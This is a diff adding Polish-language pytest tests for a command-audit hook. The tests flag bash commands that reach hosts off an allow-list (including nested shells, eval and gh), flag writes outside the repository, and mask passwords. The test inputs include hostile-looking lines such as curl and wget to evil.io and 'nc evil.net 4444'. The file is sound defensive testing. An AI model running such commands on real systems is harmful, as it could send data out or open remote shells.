@@ -461,3 +461,162 @@ def test_property_tokenizer_never_raises(polecenie):
     for slowa in ah.segmenty(polecenie):
         assert slowa and all(isinstance(s, str) for s in slowa)
     assert len(ah.maskuj(polecenie)) <= ah.MAKS_ZNAKOW + 1
+
+
+# --- zadanie 003: zagnieżdżone powłoki, gh, hasło przy -p, sed -i, curl -o, cd ------------------
+@pytest.mark.parametrize(
+    ("polecenie", "host"),
+    [
+        ("bash -c 'curl -s https://evil.io/x'", "evil.io"),
+        ('sh -c "wget -qO- http://evil.io"', "evil.io"),
+        ("bash -lc 'cd /x && nc evil.net 4444'", "evil.net"),
+        ("sudo sh -ec 'git push https://gitlab.com/x/y.git HEAD'", "gitlab.com"),
+        ("bash -c 'sh -c \"curl https://evil.io\"'", "evil.io"),
+        ("bash -o pipefail -c 'curl https://evil.io/x'", "evil.io"),
+        ("eval 'curl https://evil.io'", "evil.io"),
+        ("gh pr list --hostname ghe.firma.pl", "ghe.firma.pl"),
+        ("gh --hostname=ghe.firma.pl api user", "ghe.firma.pl"),
+    ],
+)
+def test_nested_shell_and_gh_network_is_flagged(tmp_path, repo, polecenie, host):
+    rekord = bash(tmp_path, repo, polecenie)
+    assert ah.F_SIEC in rekord["flagi"], rekord
+    assert host in rekord["hosty_spoza_listy"]
+
+
+@pytest.mark.parametrize(
+    "polecenie",
+    [
+        "bash -c 'curl -s https://fapi.binance.com/fapi/v1/time'",
+        "bash -c 'echo ok' && sh -c 'ls -la'",
+        "bash tools/setup_serwer.sh",
+        "gh api repos/piotrgebala/alpha/pulls",
+        "gh pr create --title x --body y",
+        "gh --version",
+        "gh help",
+    ],
+)
+def test_nested_shell_and_gh_to_allowed_hosts_are_not_flagged(tmp_path, repo, polecenie):
+    assert bash(tmp_path, repo, polecenie)["flagi"] == [], polecenie
+
+
+def test_gh_is_a_network_program_on_api_github(tmp_path, repo):
+    assert ah.siec_w_segmencie("gh", ["api", "user"], "gh api user", str(repo)) == (
+        True,
+        ["api.github.com"],
+    )
+    assert ah.siec_w_segmencie("gh", [], "gh", str(repo)) is None
+    assert "api.github.com" in HOSTY
+
+
+def test_shell_command_extraction():
+    assert ah.polecenie_powloki("bash", ["-c", "ls"]) == "ls"
+    assert ah.polecenie_powloki("sh", ["-e", "-c", "ls"]) == "ls"
+    assert ah.polecenie_powloki("bash", ["-lc", "ls", "arg0"]) == "ls"
+    assert ah.polecenie_powloki("bash", ["--norc", "-c", "ls"]) == "ls"
+    assert ah.polecenie_powloki("bash", ["skrypt.sh"]) is None
+    assert ah.polecenie_powloki("bash", ["-x", "skrypt.sh"]) is None
+    assert ah.polecenie_powloki("bash", ["<", "plik"]) is None
+    assert ah.polecenie_powloki("python", ["-c", "x"]) is None
+    assert ah.polecenie_powloki("eval", ["echo", "x"]) == "echo x"
+
+
+def test_nesting_depth_is_bounded(tmp_path, repo):
+    polecenie = "curl https://evil.io"
+    for _ in range(ah.MAKS_ZAGNIEZDZENIA + 3):
+        polecenie = "bash -c " + json.dumps(polecenie)
+    rekord = bash(tmp_path, repo, polecenie)  # za głęboko: nie widzi sieci, ale nie pada
+    assert ah.F_BLAD not in rekord["flagi"]
+
+
+@pytest.mark.parametrize(
+    ("polecenie", "flaga", "sciezka"),
+    [
+        ("sed -i 's/a/b/' /etc/hosts", ah.F_ZAPIS, "/etc/hosts"),
+        ("sed -i.bak -e s/a/b/ /srv/x.conf", ah.F_ZAPIS, "/srv/x.conf"),
+        ("sed -Ei 's/a/b/' /srv/x.conf", ah.F_ZAPIS, "/srv/x.conf"),
+        ("sed --in-place -e s/a/b/ /srv/x.conf", ah.F_ZAPIS, "/srv/x.conf"),
+        ("sed -i -e s/a/b/ -e s/c/d/ plik.txt /srv/y.txt", ah.F_ZAPIS, "/srv/y.txt"),
+        (f"sed -i s/a/b/ {TMP_TESTOWY}/k.txt", ah.F_TMP, f"{TMP_TESTOWY}/k.txt"),
+        ("bash -c 'echo x | tee /srv/kanal.txt'", ah.F_ZAPIS, "/srv/kanal.txt"),
+        ("curl -o /srv/x.bin https://github.com/a", ah.F_ZAPIS, "/srv/x.bin"),
+        ("curl --output=/srv/x.bin https://github.com/a", ah.F_ZAPIS, "/srv/x.bin"),
+        ("wget -O /srv/x.bin https://github.com/a", ah.F_ZAPIS, "/srv/x.bin"),
+        (f"cd {TMP_TESTOWY} && curl -o x https://github.com/a", ah.F_TMP, f"{TMP_TESTOWY}/x"),
+        ("cd /srv && echo x > y.txt", ah.F_ZAPIS, "/srv/y.txt"),
+        ("cd /srv; cp /dev/null z.txt", ah.F_ZAPIS, "/srv/z.txt"),
+    ],
+)
+def test_sed_curl_output_and_cd_writes_are_flagged(tmp_path, repo, polecenie, flaga, sciezka):
+    rekord = bash(tmp_path, repo, polecenie)
+    assert rekord["flagi"] == [flaga], rekord
+    assert os.path.realpath(sciezka) in rekord["sciezki_oznaczone"]
+
+
+@pytest.mark.parametrize(
+    "polecenie",
+    [
+        "sed -i 's/a/b/' tools/x.py",
+        "sed -n 1,5p /etc/hosts",
+        "sed 's/a/b/' /etc/hosts > wynik.txt",
+        "sed -e s/a/b/ /etc/hosts",
+        "curl -s -o /dev/null https://github.com",
+        "curl -o wynik.json https://api.github.com/x",
+        "wget -qO- https://api.bybit.com/v5/market/time",
+        "cd tools && echo x > y.txt",
+        "cd - && echo x > y.txt",
+    ],
+)
+def test_reads_and_writes_inside_repo_are_not_flagged(tmp_path, repo, polecenie):
+    assert bash(tmp_path, repo, polecenie)["flagi"] == [], polecenie
+
+
+def test_cd_does_not_move_repo_boundary(tmp_path, repo):
+    """Po `cd /tmp` repozytorium dalej wyznacza `cwd` sesji — `/tmp` nie staje się „repo”."""
+    rekord = bash(tmp_path, repo, "cd /srv && echo x > /srv/a.txt")
+    assert rekord["flagi"] == [ah.F_ZAPIS]
+
+
+@pytest.mark.parametrize(
+    ("polecenie", "zostaje"),
+    [
+        ("mysql -u root -phunter2x baza", "mysql -u root -p*** baza"),
+        ("mysqldump -p'hunter2x' baza > kopia.sql", "mysqldump -p'***' baza > kopia.sql"),
+        ("mariadb -P3306 -phunter2x", "mariadb -P3306 -p***"),
+        ("cd x && mysql --port=3306 -phunter2x baza", "cd x && mysql --port=3306 -p*** baza"),
+        ("sshpass -p hunter2x ssh user@host", "sshpass -p *** ssh user@host"),
+        ("sshpass -phunter2x scp a user@host:b", "sshpass -p*** scp a user@host:b"),
+    ],
+)
+def test_password_glued_to_p_is_masked(tmp_path, repo, polecenie, zostaje):
+    rekord = bash(tmp_path, repo, polecenie)
+    assert "hunter2x" not in json.dumps(rekord)
+    assert rekord["polecenie"] == zostaje
+
+
+@pytest.mark.parametrize(
+    "polecenie",
+    [
+        "mysql -u root -p baza",  # `-p` z odstępem: pytanie o hasło, `baza` to nazwa bazy
+        "psql -p 5432 -d baza",  # w psql `-p` to port
+        "ls -p katalog",
+        "grep -pattern plik",
+        "tar -pxf archiwum.tar",
+    ],
+)
+def test_p_option_of_other_programs_is_kept(tmp_path, repo, polecenie):
+    assert bash(tmp_path, repo, polecenie)["polecenie"] == polecenie
+
+
+@settings(max_examples=150, deadline=None)
+@given(polecenie=st.text(st.characters(blacklist_characters="\x00"), max_size=200))
+def test_property_nested_shell_analysis_never_raises(polecenie):
+    """Bajt zerowy wyłączony: w ścieżce daje ValueError → wiersz z `blad_analizy` (niżej)."""
+    wynik = ah.Wynik()
+    for zewnetrzne in (f"bash -c {json.dumps(polecenie)}", f"cd {polecenie} && sed -i {polecenie}"):
+        ah.analizuj_bash(wynik, zewnetrzne, "/nieistniejace/repo", HOSTY, "/nieistniejacy/audyt")
+    assert isinstance(wynik.flagi, set)
+
+
+def test_null_byte_in_nested_path_gives_analysis_error_row(tmp_path, repo):
+    assert bash(tmp_path, repo, "bash -c 'cat /x\x00y'")["flagi"] == [ah.F_BLAD]
